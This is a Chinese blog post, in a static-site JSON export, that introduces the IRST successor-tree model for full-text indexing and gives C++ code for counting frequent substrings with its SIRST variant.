Algorithm\n---\n##开篇##\nIRST,互关联后继树，是国内胡运发教授根据序列字符的有序性和冗余性提出的一种新型的**海量全文存储,索引**模型。因为刚刚写了一个关于这个的东西，暂且学习学习这是个什么东西吧。\n<!--more-->\n##说明##\n前驱后继的概念不解释了。重点是我觉得这种树很有意思。理论什么的一句都不说，直接上例子。\n![](/image/20150209005007.png)\n\n大体解释一下这个例子吧。全文是abcabaabc，首先从a开始，下边走第一个分支是(b,1)，表示下边一个字符是b开头的树的第一个分支，我们来到根为b的这个树，看到第一个分支是(c,1)，说明下一个是c为根的第一个分支，所以就是走到c树，看到第一个分支是(a,2)，说明下一个字符是a的第二个分支，然后我们来到了a的第二个分支，发现是(b,2)，说明下一个是b的第二个分支。以此类推。\n\n这么做有什么好处呢？我们来看看这个树首先干了什么吧。所谓**互关联后继树**，他就是一颗后继树。说白了呢就是标明了每个字符位置的后继位置。用二元组的方式，标出了后继字符在这个字符的第几次出现。假如说是a为根的树，下边有一个(b,2)，就说明现在这个位置，下一个字符是b，而且这个b是全文第二个b。\n\n这样子下来呢，就很容易找到某个字符一共出现了多少次（树的叶子节点的大小），以及后继结点的标号以及出现在什么位置。甚至进一步的运用，可以涉及到识别字串出现的次数。\n\n这里先说一下具体生成这棵树的方法。\n\n![](/image/20150209005837.png)\n![](/image/20150209005849.png)\n\n具体代码实现的时候会有点变化。因为我在写代码的时候发现先做第四步，在前驱节点树的节点添加会更快捷方便。所以我的代码写成了这样。\n\n```\nwhile(!input.eof()){\n        input >> N[i].length >> N[i].data;\n        //添加到上一个节点树\n        if(i){\n            temp = get(N[i - 1].data);\n            SI[temp].child[SI[temp].child.size() - 1].data = N[i].data;\n            if(get(N[i].data) != -1) SI[temp].child[SI[temp].child.size() - 1].pos = SI[get(N[i].data)].child.size();\n            else SI[temp].child[SI[temp].child.size() - 1].pos = 0;\n        }\n        // 添加本节点树\n        if(get(N[i].data) == -1){\n            TSI.child.clear();\n            TSI.id = N[i].data;\n            SI[cnt ++] = TSI;\n        }\n\n        temp = get(N[i].data);\n        TNo.length = N[i].length;\n        TNo.data = -1;\n        TNo.pos = -1;\n        SI[temp].child.push_back(TNo);\n        ++ i;\n}\n```\n这个代码呐，一会会放出能运行的完整版本。先凑合看吧。\n\n##具体应用##\n这里重点记录一个应用，就是说寻找所谓的频繁因子吧。别管这个因子是什么。能寻找出频繁存在的串。\n\n这种东西，借鉴一下一个概念，所谓SIRST，**时序互关联后继树**，听起来如何的高大上，其实道理很简单。就是在IRST的节点二元组(a,1)类似的东西前边，加上一个属于这个二元组的label，我们可以计算出这个label出现的次数大约多少次的串等等。\n\n好处是每个串只需要计算一次。因为我们这样子很轻松的能统计出来串出现的次数。比方说刚刚的例子，我们要统计一下ab这个串出现的次数，只需要从a开始，计算一下孩子结点中b的个数就行了。另外如果要求abc这个串出现的次数，那我们就从a开始，递归的求下去就行了。这里不多说了，从a开始，找到孩子中有b的叶子，假如说是(b,1)(b,2),我们接着去b树里边找1，2分支的，如果有c就继续递归就好了。这样统计字串个数倒是挺简单的。\n\n这里我写的示例程序，主要是解决找label出现次数多余Fmin的子串。不断的递归寻找，最后输出找到的子串以及对应的次数。\n\n目前发现这个奇怪的树的作用也就是找子串出现次数很有意思。\n\n```\n#include <stdio.h>\n#include <vector>\n#include <iostream>\n#include <string.h>\n#include <fstream>\n#include <stdlib.h>\n\n#define MAX 100\nint Fmin = 2;\n\nusing namespace std;\nint cnt = 0;\n\n\nstruct Node{\n    int length;\n    int data;\n    int pos;\n};\n\nstruct SIRST{\n    int id;\n    vector<Node> child;\n};\n\nSIRST SI[MAX];\n\nint get(int data){\n    for(int i = 0;i < cnt;++ i){\n        if(SI[i].id == data) return i;\n    }\n    return -1;\n}\n\nstring getstring(int n){\n    string temp = \"\",temp1 = \"\";\n    while(n){\n        temp1 += (n % 10) + '0';\n        n /= 10;\n    }\n    for(int i = temp1.length() - 1;i >= 0;-- i){\n        temp += temp1[i];\n    }\n    return temp;\n}\n\nvoid getres(string now, vector<int> it, int root){\n    int num_l[MAX];\n    memset(num_l,0,sizeof(num_l));\n    vector<int> next[MAX];\n    string newnow = \"\";\n    int flag = 0;\n    for(int i = 0;i < it.size();++ i){\n        num_l[SI[root].child[it[i]].length] ++;\n    }\n    for(int i = 0;i < MAX - 10 ; ++ i){\n        if(num_l[i] && (num_l[i] >= Fmin)){\n           newnow = now + \"(\";\n           newnow += getstring(i) + ',';\n           newnow += getstring(SI[root].id) + ')';\n           cout << newnow << \"  \" << num_l[i] << endl;\n            for(int j = 0;j < it.size();++ j){\n                int temp = it[j];\n                if(SI[root].child[temp].length == i){\n                    next[get(SI[root].child[temp].data)].push_back(SI[root].child[temp].pos);\n                    //cout << \"pos\" << SI[root].child[temp].pos << endl;\n                }\n            }\n            for(int j = 0;j < cnt;++ j){\n                if(next[j].size() >= Fmin){\n                    getres(newnow, next[j], j);\n                }\n                next[j].clear();\n            }\n        }\n    }\n    return ;\n}\n\n\nint main(){\n\n    Node N[1000],TNo;\n    SIRST TSI;\n    int temp;\n    int temp1;\n    printf(\"Please input the Fmin\\n\");\n    scanf(\"%d\",&Fmin);\n    ifstream input;\n    input.open(\"in.txt\");\n    //freopen(\"out.txt\",\"w\",stdout);\n    int i = 0;\n\n    //算法一\n\n    while(!input.eof()){\n        input >> N[i].length >> N[i].data;\n        //添加到上一个节点树\n        if(i){\n            temp = get(N[i - 1].data);\n            SI[temp].child[SI[temp].child.size() - 1].data = N[i].data;\n            if(get(N[i].data) != -1) SI[temp].child[SI[temp].child.size() - 1].pos = SI[get(N[i].data)].child.size();\n            else SI[temp].child[SI[temp].child.size() - 1].pos = 0;\n        }\n        // 添加本节点树\n        if(get(N[i].data) == -1){\n            TSI.child.clear();\n            TSI.id = N[i].data;\n            SI[cnt ++] = TSI;\n        }\n\n        temp = get(N[i].data);\n        TNo.length = N[i].length;\n        TNo.data = -1;\n        TNo.pos = -1;\n        SI[temp].child.push_back(TNo);\n        ++ i;\n    }\n\n    for(int i = 0;i < cnt;++ i){\n        printf(\"%d\\n\",SI[i].id);\n        for(int j = 0;j < SI[i].child.size();++ j){\n            printf(\"(%d,%d,%d) \",SI[i].child[j].length,SI[i].child[j].data,SI[i].child[j].pos == -1 ? -1 : (SI[i].child[j].pos + 1));\n        }\n        printf(\"\\n\");\n    }\n\n\n    //算法二\n    vector<int> VTemp;\n    string STemp = \"\";\n    for(int i = 0;i < cnt;++ i){\n        VTemp.clear();\n        for(int j = 0;j < SI[i].child.size();++ j){\n            VTemp.push_back(j);\n        }\n        getres(STemp,VTemp,i);\n    }\n\n\n    return 0;\n}\n```\n如有问题，欢迎提出。","slug":"IRST","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681un000qwypdb3ad7m29","content":"<p>##开篇##<br>IRST,互关联后继树，是国内胡运发教授根据序列字符的有序性和冗余性提出的一种新型的<strong>海量全文存储,索引</strong>模型。因为刚刚写了一个关于这个的东西，暂且学习学习这是个什么东西吧。<br><a id=\"more\"></a></p>\n<p>##说明##<br>前驱后继的概念不解释了。重点是我觉得这种树很有意思。理论什么的一句都不说，直接上例子。<br><img src=\"/image/20150209005007.png\" alt=\"\"></p>\n<p>大体解释一下这个例子吧。全文是abcabaabc，首先从a开始，下边走第一个分支是(b,1)，表示下边一个字符是b开头的树的第一个分支，我们来到根为b的这个树，看到第一个分支是(c,1)，说明下一个是c为根的第一个分支，所以就是走到c树，看到第一个分支是(a,2)，说明下一个字符是a的第二个分支，然后我们来到了a的第二个分支，发现是(b,2)，说明下一个是b的第二个分支。以此类推。</p>\n<p>这么做有什么好处呢？我们来看看这个树首先干了什么吧。所谓<strong>互关联后继树</strong>，他就是一颗后继树。说白了呢就是标明了每个字符位置的后继位置。用二元组的方式，标出了后继字符在这个字符的第几次出现。假如说是a为根的树，下边有一个(b,2)，就说明现在这个位置，下一个字符是b，而且这个b是全文第二个b。</p>\n<p>这样子下来呢，就很容易找到某个字符一共出现了多少次（树的叶子节点的大小），以及后继结点的标号以及出现在什么位置。甚至进一步的运用，可以涉及到识别字串出现的次数。</p>\n<p>这里先说一下具体生成这棵树的方法。</p>\n<p><img src=\"/image/20150209005837.png\" alt=\"\"><br><img src=\"/image/20150209005849.png\" alt=\"\"></p>\n<p>具体代码实现的时候会有点变化。因为我在写代码的时候发现先做第四步，在前驱节点树的节点添加会更快捷方便。所以我的代码写成了这样。</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title\">while</span>(!input.eof())&#123;</span><br><span class=\"line\">        input &gt;&gt; <span class=\"type\">N</span>[i].length &gt;&gt; <span class=\"type\">N</span>[i].<span class=\"class\"><span class=\"keyword\">data</span>;</span></span><br><span class=\"line\">        //添加到上一个节点树</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i)&#123;</span><br><span class=\"line\">            temp = get(<span class=\"type\">N</span>[i - <span class=\"number\">1</span>].<span class=\"class\"><span class=\"keyword\">data</span>);</span></span><br><span class=\"line\">            <span class=\"type\">SI</span>[temp].child[<span class=\"type\">SI</span>[temp].child.size() - <span class=\"number\">1</span>].<span class=\"class\"><span class=\"keyword\">data</span> = <span class=\"type\">N</span>[i].<span class=\"keyword\">data</span>;</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(get(<span class=\"type\">N</span>[i].<span class=\"class\"><span class=\"keyword\">data</span>) != -1) <span class=\"type\">SI</span>[temp].child[<span class=\"type\">SI</span>[temp].child.size() - 1].pos = <span class=\"type\">SI</span>[get(<span class=\"type\">N</span>[<span class=\"title\">i</span>].<span class=\"title\">data</span>)].child.size();</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"type\">SI</span>[temp].child[<span class=\"type\">SI</span>[temp].child.size() - <span class=\"number\">1</span>].pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // 添加本节点树</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(get(<span class=\"type\">N</span>[i].<span class=\"class\"><span class=\"keyword\">data</span>) == -1)&#123;</span><br><span class=\"line\">            <span class=\"type\">TSI</span>.<span class=\"title\">child</span>.<span class=\"title\">clear</span>();</span><br><span class=\"line\">            <span class=\"type\">TSI</span>.<span class=\"title\">id</span> = <span class=\"type\">N</span>[<span class=\"title\">i</span>].<span class=\"title\">data</span>;</span><br><span class=\"line\">            <span class=\"type\">SI</span>[<span class=\"title\">cnt</span> ++] = <span class=\"type\">TSI</span>;</span><br><span class=\"line\">        &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        temp = get(<span class=\"type\">N</span>[i].<span class=\"class\"><span class=\"keyword\">data</span>);</span></span><br><span class=\"line\">        <span class=\"type\">TNo</span>.length = <span class=\"type\">N</span>[i].length;</span><br><span class=\"line\">        <span class=\"type\">TNo</span>.<span class=\"class\"><span class=\"keyword\">data</span> = -1;</span></span><br><span class=\"line\">        <span class=\"type\">TNo</span>.pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"type\">SI</span>[temp].child.push_back(<span class=\"type\">TNo</span>);</span><br><span class=\"line\">        ++ i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个代码呐，一会会放出能运行的完整版本。先凑合看吧。</p>\n<p>##具体应用##<br>这里重点记录一个应用，就是说寻找所谓的频繁因子吧。别管这个因子是什么。能寻找出频繁存在的串。</p>\n<p>这种东西，借鉴一下一个概念，所谓SIRST，<strong>时序互关联后继树</strong>，听起来如何的高大上，其实道理很简单。就是在IRST的节点二元组(a,1)类似的东西前边，加上一个属于这个二元组的label，我们可以计算出这个label出现的次数大约多少次的串等等。</p>\n<p>好处是每个串只需要计算一次。因为我们这样子很轻松的能统计出来串出现的次数。比方说刚刚的例子，我们要统计一下ab这个串出现的次数，只需要从a开始，计算一下孩子结点中b的个数就行了。另外如果要求abc这个串出现的次数，那我们就从a开始，递归的求下去就行了。这里不多说了，从a开始，找到孩子中有b的叶子，假如说是(b,1)(b,2),我们接着去b树里边找1，2分支的，如果有c就继续递归就好了。这样统计字串个数倒是挺简单的。</p>\n<p>这里我写的示例程序，主要是解决找label出现次数多余Fmin的子串。不断的递归寻找，最后输出找到的子串以及对应的次数。</p>\n<p>目前发现这个奇怪的树的作用也就是找子串出现次数很有意思。</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX 100</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> Fmin = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"keyword\">int</span> cnt = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> Node&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> length;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> data;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> pos;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> SIRST&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> id;</span><br><span class=\"line\">    vector&lt;Node&gt; child;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">SIRST SI[MAX];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> <span class=\"built_in\">get</span>(<span class=\"keyword\">int</span> data)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; cnt;++ i)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(SI[i].id == data) <span class=\"built_in\">return</span> i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">string</span> getstring(<span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">string</span> temp = <span class=\"string\">\"\"</span>,temp1 = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(n)&#123;</span><br><span class=\"line\">        temp1 += (n % <span class=\"number\">10</span>) + <span class=\"string\">'0'</span>;</span><br><span class=\"line\">        n /= <span class=\"number\">10</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = temp1.length() - <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">        temp += temp1[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> getres(<span class=\"keyword\">string</span> now, vector&lt;<span class=\"keyword\">int</span>&gt; it, <span class=\"keyword\">int</span> root)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> num_l[MAX];</span><br><span class=\"line\">    memset(num_l,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(num_l));</span><br><span class=\"line\">    vector&lt;<span class=\"keyword\">int</span>&gt; next[MAX];</span><br><span class=\"line\">    <span class=\"keyword\">string</span> newnow = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; it.<span class=\"built_in\">size</span>();++ i)&#123;</span><br><span class=\"line\">        num_l[SI[root].child[it[i]].length] ++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; MAX - <span class=\"number\">10</span> ; ++ i)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(num_l[i] &amp;&amp; (num_l[i] &gt;= Fmin))&#123;</span><br><span class=\"line\">           newnow = now + <span class=\"string\">\"(\"</span>;</span><br><span class=\"line\">           newnow += getstring(i) + <span class=\"string\">','</span>;</span><br><span class=\"line\">           newnow += getstring(SI[root].id) + <span class=\"string\">')'</span>;</span><br><span class=\"line\">           cout &lt;&lt; newnow &lt;&lt; <span class=\"string\">\"  \"</span> &lt;&lt; num_l[i] &lt;&lt; endl;</span><br><span class=\"line\">            <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;j &lt; it.<span class=\"built_in\">size</span>();++ j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> temp = it[j];</span><br><span class=\"line\">                <span class=\"built_in\">if</span>(SI[root].child[temp].length == i)&#123;</span><br><span class=\"line\">                    next[<span class=\"built_in\">get</span>(SI[root].child[temp].data)].push_back(SI[root].child[temp].pos);</span><br><span class=\"line\">                    <span class=\"comment\">//cout &lt;&lt; \"pos\" &lt;&lt; SI[root].child[temp].pos &lt;&lt; endl;</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;j &lt; cnt;++ j)&#123;</span><br><span class=\"line\">                <span class=\"built_in\">if</span>(next[j].<span class=\"built_in\">size</span>() &gt;= Fmin)&#123;</span><br><span class=\"line\">                    getres(newnow, next[j], j);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                next[j].<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> main()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    Node N[<span class=\"number\">1000</span>],TNo;</span><br><span class=\"line\">    SIRST TSI;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> temp;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> temp1;</span><br><span class=\"line\">    printf(<span class=\"string\">\"Please input the Fmin\\n\"</span>);</span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;Fmin);</span><br><span class=\"line\">    ifstream input;</span><br><span class=\"line\">    input.<span class=\"built_in\">open</span>(<span class=\"string\">\"in.txt\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">//freopen(\"out.txt\",\"w\",stdout);</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//算法一</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">while</span>(!input.eof())&#123;</span><br><span class=\"line\">        input &gt;&gt; N[i].length &gt;&gt; N[i].data;</span><br><span class=\"line\">        <span class=\"comment\">//添加到上一个节点树</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(i)&#123;</span><br><span class=\"line\">            temp = <span class=\"built_in\">get</span>(N[i - <span class=\"number\">1</span>].data);</span><br><span class=\"line\">            SI[temp].child[SI[temp].child.<span class=\"built_in\">size</span>() - <span class=\"number\">1</span>].data = N[i].data;</span><br><span class=\"line\">            <span class=\"built_in\">if</span>(<span class=\"built_in\">get</span>(N[i].data) != <span class=\"number\">-1</span>) SI[temp].child[SI[temp].child.<span class=\"built_in\">size</span>() - <span class=\"number\">1</span>].pos = SI[<span class=\"built_in\">get</span>(N[i].data)].child.<span class=\"built_in\">size</span>();</span><br><span class=\"line\">            <span class=\"built_in\">else</span> SI[temp].child[SI[temp].child.<span class=\"built_in\">size</span>() - <span class=\"number\">1</span>].pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 添加本节点树</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(<span class=\"built_in\">get</span>(N[i].data) == <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">            TSI.child.<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">            TSI.id = N[i].data;</span><br><span class=\"line\">            SI[cnt ++] = TSI;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        temp = <span class=\"built_in\">get</span>(N[i].data);</span><br><span class=\"line\">        TNo.length = N[i].length;</span><br><span class=\"line\">        TNo.data = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        TNo.pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        SI[temp].child.push_back(TNo);</span><br><span class=\"line\">        ++ i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; cnt;++ i)&#123;</span><br><span class=\"line\">        printf(<span class=\"string\">\"%d\\n\"</span>,SI[i].id);</span><br><span class=\"line\">        <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;j &lt; SI[i].child.<span class=\"built_in\">size</span>();++ j)&#123;</span><br><span class=\"line\">            printf(<span class=\"string\">\"(%d,%d,%d) \"</span>,SI[i].child[j].length,SI[i].child[j].data,SI[i].child[j].pos == <span class=\"number\">-1</span> ? <span class=\"number\">-1</span> : (SI[i].child[j].pos + <span class=\"number\">1</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        printf(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//算法二</span></span><br><span class=\"line\">    vector&lt;<span class=\"keyword\">int</span>&gt; VTemp;</span><br><span class=\"line\">    <span class=\"keyword\">string</span> STemp = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; cnt;++ i)&#123;</span><br><span class=\"line\">        VTemp.<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">        <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;j &lt; SI[i].child.<span class=\"built_in\">size</span>();++ j)&#123;</span><br><span class=\"line\">            VTemp.push_back(j);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        getres(STemp,VTemp,i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如有问题，欢迎提出。</p>\n","excerpt":"<p>##开篇##<br>IRST,互关联后继树，是国内胡运发教授根据序列字符的有序性和冗余性提出的一种新型的<strong>海量全文存储,索引</strong>模型。因为刚刚写了一个关于这个的东西，暂且学习学习这是个什么东西吧。<br>","more":"</p>\n<p>##说明##<br>前驱后继的概念不解释了。重点是我觉得这种树很有意思。理论什么的一句都不说，直接上例子。<br><img src=\"/image/20150209005007.png\" 